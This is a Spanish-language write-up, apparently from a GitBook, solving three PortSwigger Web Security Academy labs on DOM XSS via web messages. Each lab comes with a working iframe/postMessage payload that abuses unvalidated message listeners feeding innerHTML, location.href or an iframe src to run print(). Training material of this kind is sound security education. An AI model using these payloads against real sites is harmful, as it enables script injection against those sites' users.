# DOM-based vulnerabilities

## Lab: DOM XSS using web messages

### Enunciado

Este laboratorio demuestra una vulnerabilidad sencilla de mensajes web. Usa el servidor de exploits para enviar un mensaje al sitio objetivo que provoque la ejecución de la función `print()`.

### Resolución

Vemos el código fuente y vemos una función **innerHTML** asigna directamente el contenido al elemento **div** con id **ads**.\
Si **e.data** contiene código HTML o JavaScript, **el navegador lo interpretará y ejecutará**.

Además, **observamos que la respuesta no incluye la cabecera `x-frame-options`:**

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Esto permite **incrustar el sitio en un iframe**.

{% embed url="https://developer.mozilla.org/es/docs/Web/API/Window/postMessage" %}

**Con esa base, podemos crear un HTML malicioso como este:**

```html
<iframe src="https://0a5e00ac04903464809e034d00d300ba.web-security-academy.net/" 
        onload="this.contentWindow.postMessage('<img src=1 onerror=alert(XSS)>','*')">
</iframe>
```

Pero para **resolver el laboratorio**, usaremos el payload que dispara **print():**

```html
<iframe src="https://0a5e00ac04903464809e034d00d300ba.web-security-academy.net/" 
        onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM XSS using web messages and a JavaScript URL

### Enunciado

Este laboratorio demuestra una vulnerabilidad de redirección basada en el DOM que se activa mediante web messaging. Crea una página HTML en el servidor de exploits que aproveche esta vulnerabilidad y que ejecute la función `print()`.

### Resolución

Vemos el código fuente.&#x20;

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

En este caso, **el procesamiento del web message es vulnerable a XSS basado en DOM**, porque **el event listener no valida correctamente el origen de los mensajes recibidos ni las propiedades y funciones que usa.**

Además, **identificamos un&#x20;**_**sink**_**&#x20;peligroso** `location.href`que permite redirigir a otra página. Sin embargo, **antes de hacer la redirección**, el código verifica que los datos del mensaje contengan **http:** o **https.**

**Con esta información, podemos preparar un HTML malicioso** que use un `<iframe>` y la función **postMessage()** para enviar datos al listener vulnerable en la página objetivo:

```html
<html>
  <body>
    <iframe src="https://0a2b0071046a9d6681aec51300f90043.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*');"></iframe>
  </body>
</html>
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM XSS using web messages and `JSON.parse`

### Enunciado

Este laboratorio utiliza web messaging y analiza el mensaje como JSON. Crea una página HTML en el servidor de exploits que aproveche esta vulnerabilidad y ejecute la función `print()`.

### Resolución

Vemos el código fuente.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

En este caso, **hay un event listener que recibe mensajes web y los interpreta como datos JSON usando `JSON.parse`**. El problema es que **el listener no valida correctamente el origen del mensaje**, por lo que acepta cualquier entrada.

Dentro del código, hay un `switch` con un caso llamado **`load-channel`**, que **cambia el atributo `src` de un elemento `<iframe>`**. Esto convierte ese atributo en un **sink peligroso**.

Con esta información, podemos **crear un HTML malicioso con un `<iframe>`** y usar `postMessage()` para enviar un mensaje manipulado al listener vulnerable.\
El listener tomará el contenido y lo pasará al sink en la página principal:

```javascript
postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}", "*")
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Creamos el siguiente paylaod.

```
<html>
    <body>
        <iframe src="https://0ae200cd04519f0c824b014900eb0008.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}","*");'></iframe>
    </body>
</html>
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
